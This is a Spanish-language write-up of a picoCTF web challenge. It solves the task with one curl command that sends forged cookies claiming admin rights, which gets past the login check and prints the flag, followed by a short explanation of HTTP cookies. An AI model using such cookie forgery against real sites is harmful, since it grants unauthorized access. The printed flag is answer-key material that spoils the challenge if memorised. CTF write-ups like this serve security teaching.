## Objetivo:
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/15796/` ([link](https://jupiter.challenges.picoctf.org/problem/15796/)) or http://jupiter.challenges.picoctf.org:15796

**Hints:**
1. Hmm it doesn't seem to check anyone's password, except for Joe's?

## Solución:

```bash
┌──(kali㉿kali)-[~]
└─$ curl -s https://jupiter.challenges.picoctf.org/problem/15796/flag -H "Cookie: username=admin; password=1234; admin=True"  | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>:    <code>picoCTF{th3_c0nsp1r4cy_l1v3s_6edb3f5f}</code></p>
                                                                                
┌──(kali㉿kali)-[~]
└─$
```

### Flag: picoCTF{th3_c0nsp1r4cy_l1v3s_6edb3f5f}

## Notas adicionales:
| Comando | Descripción |
| --- | --- |
| curl | Curl es una herramienta de línea de comandos de Linux que sirve para transferir datos hacia o desde un servidor con URL, utilizando cualquiera de los protocolos soportados (HTTP, FTP, POP3, IMAP, SMTP, SCP, SFTP, TFTP, TELNET, LDAP…). |

### ¿Qué son las cookies?

Las cookies, de nombre más exacto **HTTP cookies**, es una tecnología que en su día inventó el navegador Netscape (descanse en paz), actualmente definida en el estándar RFC 6265, y que consiste básicamente en información enviada o recibida en las cabeceras HTTP y que **queda almacenada localmente client-side** durante un tiempo determinado. En otras palabras, es información que queda almacenada en el dispositivo del usuario y que se envía hacia y desde el servidor web en las cabeceras HTTP.

## Referencias:
- [http](https://developer.mozilla.org/en-US/docs/Web/HTTP)
- [http headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
- [request headers](https://developer.mozilla.org/en-US/docs/Glossary/Request_header) 
- [request methods](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods)
- [cookies](https://en.wikipedia.org/wiki/HTTP_cookie)